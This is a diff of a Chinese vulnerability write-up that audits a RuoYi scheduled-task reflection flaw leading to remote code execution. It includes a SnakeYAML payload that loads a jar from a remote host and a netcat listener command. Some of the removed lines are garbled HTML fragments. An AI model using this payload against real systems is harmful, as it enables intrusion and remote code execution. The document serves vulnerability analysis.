@@ -107,38 +107,48 @@ nc -lvnp 1234
 org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://192.168.3.3:2333/yaml-payload.jar"]]]]')
 ```
 
-[![](../../.resource/remote/92d78b4f7056a9bded352208da919e4bc6ad66f780817f03fd1237d0d783fc8f.png)代码审计过程：](../../.resource/remote/ae0f09bb11708bc25ec8984fc88867502e4fd0ceb5c902791df29d37c3d377d4.png)
+[![](../../.resource/remote/92d78b4f7056a9bded352208da919e4bc6ad66f780817f03fd1237d0d783fc8f.png)](../../.resource/remote/92d78b4f7056a9bded352208da919e4bc6ad66f780817f03fd1237d0d783fc8f.png)
 
-[1、当我们添加并执行计划任务时，若依 (ruoyi) 会调用 com.ruoyi.quartz.util#JobInvokeUtil 解析并执行我们传入的数据  
+代码审计过程：
+
+[![](../../.resource/remote/ae0f09bb11708bc25ec8984fc88867502e4fd0ceb5c902791df29d37c3d377d4.png)](../../.resource/remote/ae0f09bb11708bc25ec8984fc88867502e4fd0ceb5c902791df29d37c3d377d4.png)
+
+1、当我们添加并执行计划任务时，若依 (ruoyi) 会调用 com.ruoyi.quartz.util#JobInvokeUtil 解析并执行我们传入的数据  
 这里的代码逻辑：  
 beanName 获取传入的类名；  
 methodName 获取传入的方法名；  
 methodParams 获取传入方法的参数，如果参数异常会报错导致无法执行下一步；  
 �  
-接着判断传入的类名是否有效 (判断逻辑：是否含有小数点)，有效的话就会调用 Class.forName(beanName).newInstance(); 进行实例化，然后运行 invokeMethod(bean, methodName, methodParams); 执行该类对应的方法  
-](../../.resource/remote/ae0f09bb11708bc25ec8984fc88867502e4fd0ceb5c902791df29d37c3d377d4.png)[![](https://cdn.nlark.com/yuque/0/2021/png/357973/1639817050808-aefb6702-b5f1-4560-8688-08a53d7649be.png#clientId=ue68eae55-4845-4&from=paste&height=468&id=u47df42a0&margin=%5Bobject%20Object%5D&></a><br>
-2、可能直接贴代码大家不知道数据是怎么传输的，现在我传入一串如下数据，然后调试一下大家就明白了 (这里有个坑，传入的字符串必须用单引号包含，不然会出现问题，尤其是 EXP 的时候，刚开始复现漏洞就因为这里弄了好久还以为是玄学，感兴趣的可以看看 com.ruoyi.quartz.util#getMethodParams)</p><p></p><pre class=)java.lang.xxx.func('aaa')](https://cdn.nlark.com/yuque/0/2021/png/357973/1639815639321-e85ac05f-29b0-4162-b97b-5dc3e685c140.png#clientId=ue68eae55-4845-4&from=paste&height=900&id=ua937f630&margin=%5Bobject%20Object%5D&><img class=)
+接着判断传入的类名是否有效 (判断逻辑：是否含有小数点)，有效的话就会调用 Class.forName(beanName).newInstance(); 进行实例化，然后运行 invokeMethod(bean, methodName, methodParams); 执行该类对应的方法
 
-[![](https://cdn.nlark.com/yuque/0/2021/png/357973/1639820133920-be3c938f-d43b-4b4e-9027-b18c8f60a1f2.png#clientId=ue68eae55-4845-4&from=paste&height=900&id=u4503339b&margin=%5Bobject%20Object%5D&></a><br>
-【+】我们传入的是 java.lang.xxx.func('aaa')</p><p></p><ul>
-<li>beanName = )](https://cdn.nlark.com/yuque/0/2021/png/357973/1639818296854-9ce2ab6a-6de9-43eb-a7d5-6c2f22258529.png#clientId=ue68eae55-4845-4&from=paste&height=900&id=u65218cab&margin=%5Bobject%20Object%5D&><img class=)
+[![](../../.resource/remote/7e1869787feb93d05d8d23466b9204490aa0ec88408daf7785545e6e84e30ae9.png)](../../.resource/remote/7e1869787feb93d05d8d23466b9204490aa0ec88408daf7785545e6e84e30ae9.png)
 
-*   [methodName = "func"](https://cdn.nlark.com/yuque/0/2021/png/357973/1639818296854-9ce2ab6a-6de9-43eb-a7d5-6c2f22258529.png#clientId=ue68eae55-4845-4&from=paste&height=900&id=u65218cab&margin=%5Bobject%20Object%5D&><img class=)
-[*   methodParams = "aaa"
+2、可能直接贴代码大家不知道数据是怎么传输的，现在我传入一串如下数据，然后调试一下大家就明白了 (这里有个坑，传入的字符串必须用单引号包含，不然会出现问题，尤其是 EXP 的时候，刚开始复现漏洞就因为这里弄了好久还以为是玄学，感兴趣的可以看看 com.ruoyi.quartz.util#getMethodParams)
+
+```text
+java.lang.xxx.func('aaa')
+```
+
+[![](../../.resource/remote/fef44522d85426a9a1e7fabfb56c8b8381ca5055519ec495fa0d3a431c6ee2d6.png)](../../.resource/remote/fef44522d85426a9a1e7fabfb56c8b8381ca5055519ec495fa0d3a431c6ee2d6.png)
+
+[![](../../.resource/remote/ca7322937761aebb190a58add4593e0b119bbb59a14fc37fca54115299544043.png)](../../.resource/remote/ca7322937761aebb190a58add4593e0b119bbb59a14fc37fca54115299544043.png)
+
+【+】我们传入的是 java.lang.xxx.func('aaa')
+
+*   beanName = "java.lang.xxx"
+*   methodName = "func"
+*   methodParams = "aaa"
 
 最终执行的反射代码为：Class.forName("java.lang.xxx").getDeclaredMethod("func", String.class).invoke(Class.forName("java.lang.xxx").newInstance(), "aaa")  
-
 
 3、由于反射时所需要的：类、方法、参数都是我们可控的，所以我们只需传入一个能够执行命令的类方法就能达到 getshell 的目的，该类只需要满足如下几点要求即可：
 
 *   具有 public 类型的无参构造方法
 *   自身具有 public 类型且可以执行命令的方法
 
+[![](../../.resource/remote/d0aa395e7c83b8ebd00d2f5eacce6a1cf019e0c2cd960d2c8d1e3015ce020ccb.png)](../../.resource/remote/d0aa395e7c83b8ebd00d2f5eacce6a1cf019e0c2cd960d2c8d1e3015ce020ccb.png)
 
-
-](https://cdn.nlark.com/yuque/0/2021/png/357973/1639818296854-9ce2ab6a-6de9-43eb-a7d5-6c2f22258529.png#clientId=ue68eae55-4845-4&from=paste&height=900&id=u65218cab&margin=%5Bobject%20Object%5D&><img class=)
-
-[4、在网上看文章发现大佬们找到 _**org.yaml.snakeyaml.Yaml** _满足这些条件，YAML 执行命令参考:](https://cdn.nlark.com/yuque/0/2021/png/357973/1639818296854-9ce2ab6a-6de9-43eb-a7d5-6c2f22258529.png#clientId=ue68eae55-4845-4&from=paste&height=900&id=u65218cab&margin=%5Bobject%20Object%5D&><img class=) [浅蓝大佬文章](http://www.b1ue.cn/archives/239.html)
+4、在网上看文章发现大佬们找到 _**org.yaml.snakeyaml.Yaml** _满足这些条件，YAML 执行命令参考: [浅蓝大佬文章](http://www.b1ue.cn/archives/239.html)
 
 *   个人比较喜欢调用 RMI 来执行命令，但是若依 (ruoyi) 调用 RMI 会报错，所以只能调用远程 jar 进行命令执行
 
